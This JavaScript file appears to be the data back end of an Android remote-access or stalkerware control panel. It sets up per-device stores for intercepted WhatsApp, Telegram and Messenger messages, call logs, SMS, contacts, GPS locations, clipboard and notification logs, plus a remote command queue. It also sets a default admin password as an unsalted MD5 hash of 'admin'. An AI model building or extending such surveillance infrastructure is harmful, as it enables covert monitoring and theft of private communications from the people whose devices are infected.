const low = require('lowdb');
const FileSync = require('lowdb/adapters/FileSync');
const path = require('path');
const fs = require('fs');

class DatabaseManager {
  constructor() {
    this.mainDb = null;
    this.clientDbs = new Map();
    this.dbPath = process.env.DB_PATH || './maindb.json';
    this.clientDbPath = process.env.CLIENT_DB_PATH || './clientData';
    
    this.initializeDatabase();
  }

  initializeDatabase() {
    try {
      // Ensure directories exist
      const clientDbDir = path.resolve(this.clientDbPath);
      if (!fs.existsSync(clientDbDir)) {
        fs.mkdirSync(clientDbDir, { recursive: true });
      }

      // Initialize main database
      const adapter = new FileSync(this.dbPath);
      this.mainDb = low(adapter);

      // Set default values
      this.mainDb.defaults({
        admin: {
          username: 'admin',
          password: '21232f297a57a5a743894a0e4a801fc3', // Default: admin
          loginToken: '',
          logs: [],
          ipLog: [],
          settings: {
            maxClients: 1000,
            sessionTimeout: 3600000, // 1 hour
            enableLogging: true,
            enableChatMonitoring: true
          }
        },
        clients: [],
        system: {
          version: '2.0.0',
          lastUpdate: new Date().toISOString(),
          stats: {
            totalClients: 0,
            totalMessages: 0,
            uptime: 0
          }
        }
      }).write();

      // Reset online status for all clients on startup
      const clients = this.mainDb.get('clients').value();
      if (clients && clients.length > 0) {
        this.mainDb.get('clients')
          .forEach(client => {
            client.isOnline = false;
          })
          .write();
        console.log(`Reset online status for ${clients.length} clients`);
      }

      console.log('Database initialized successfully');
    } catch (error) {
      console.error('Failed to initialize database:', error);
      throw error;
    }
  }

  getMainDb() {
    return this.mainDb;
  }

  getClientDb(clientId) {
    if (this.clientDbs.has(clientId)) {
      return this.clientDbs.get(clientId);
    }

    try {
      const clientDbFile = path.join(this.clientDbPath, `${clientId}.json`);
      const adapter = new FileSync(clientDbFile);
      const clientDb = low(adapter);

      // Set default structure for client database
      clientDb.defaults({
        clientId,
        firstSeen: new Date().toISOString(),
        lastSeen: new Date().toISOString(),
        isOnline: false,
        dynamicData: {},
        // Chat apps data
        whatsappMessages: [],
        telegramMessages: [],
        messengerMessages: [],
        chatContacts: {
          whatsapp: [],
          telegram: [],
          messenger: []
        },
        // Existing data structures
        CallData: [],
        SMSData: [],
        contacts: [],
        wifiNow: [],
        wifiLog: [],
        enabledPermissions: [],
        apps: [],
        currentFolder: [],
        downloads: [],
        GPSData: [],
        GPSSettings: {
          updateFrequency: 0
        },
        notificationLog: [],
        clipboardLog: [],
        CommandQue: []
      }).write();

      this.clientDbs.set(clientId, clientDb);
      return clientDb;
    } catch (error) {
      console.error(`Failed to get client database for ${clientId}:`, error);
      throw error;
    }
  }

  // Cleanup old client databases
  cleanupOldClients(maxAge = 30 * 24 * 60 * 60 * 1000) { // 30 days
    try {
      const files = fs.readdirSync(this.clientDbPath);
      const now = Date.now();

      files.forEach(file => {
        if (file.endsWith('.json')) {
          const filePath = path.join(this.clientDbPath, file);
          const stats = fs.statSync(filePath);
          
          if (now - stats.mtime.getTime() > maxAge) {
            fs.unlinkSync(filePath);
            console.log(`Cleaned up old client database: ${file}`);
          }
        }
      });
    } catch (error) {
      console.error('Failed to cleanup old clients:', error);
    }
  }

  // Backup database
  backup() {
    try {
      const backupDir = path.join(this.clientDbPath, 'backups');
      if (!fs.existsSync(backupDir)) {
        fs.mkdirSync(backupDir, { recursive: true });
      }

      const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
      const backupPath = path.join(backupDir, `backup-${timestamp}.json`);
      
      const backupData = {
        timestamp: new Date().toISOString(),
        mainDb: this.mainDb.getState(),
        version: '2.0.0'
      };

      fs.writeFileSync(backupPath, JSON.stringify(backupData, null, 2));
      console.log(`Database backup created: ${backupPath}`);
      
      return backupPath;
    } catch (error) {
      console.error('Failed to create database backup:', error);
      throw error;
    }
  }

  // Get database statistics
  getStats() {
    try {
      const mainDbState = this.mainDb.getState();
      const clientCount = mainDbState.clients.length;
      const onlineCount = mainDbState.clients.filter(client => client.isOnline).length;
      
      return {
        totalClients: clientCount,
        onlineClients: onlineCount,
        offlineClients: clientCount - onlineCount,
        databaseSize: this.getDatabaseSize(),
        lastBackup: this.getLastBackupTime()
      };
    } catch (error) {
      console.error('Failed to get database stats:', error);
      return null;
    }
  }

  getDatabaseSize() {
    try {
      const mainDbSize = fs.statSync(this.dbPath).size;
      let clientDbSize = 0;
      
      const files = fs.readdirSync(this.clientDbPath);
      files.forEach(file => {
        if (file.endsWith('.json')) {
          const filePath = path.join(this.clientDbPath, file);
          clientDbSize += fs.statSync(filePath).size;
        }
      });
      
      return {
        mainDb: mainDbSize,
        clientDbs: clientDbSize,
        total: mainDbSize + clientDbSize
      };
    } catch (error) {
      console.error('Failed to get database size:', error);
      return null;
    }
  }

  getLastBackupTime() {
    try {
      const backupDir = path.join(this.clientDbPath, 'backups');
      if (!fs.existsSync(backupDir)) {
        return null;
      }
      
      const files = fs.readdirSync(backupDir);
      if (files.length === 0) {
        return null;
      }
      
      const backupFiles = files
        .filter(file => file.endsWith('.json'))
        .map(file => {
          const filePath = path.join(backupDir, file);
          return {
            name: file,
            path: filePath,
            mtime: fs.statSync(filePath).mtime
          };
        })
        .sort((a, b) => b.mtime - a.mtime);
      
      return backupFiles[0]?.mtime || null;
    } catch (error) {
      console.error('Failed to get last backup time:', error);
      return null;
    }
  }
}

module.exports = DatabaseManager; 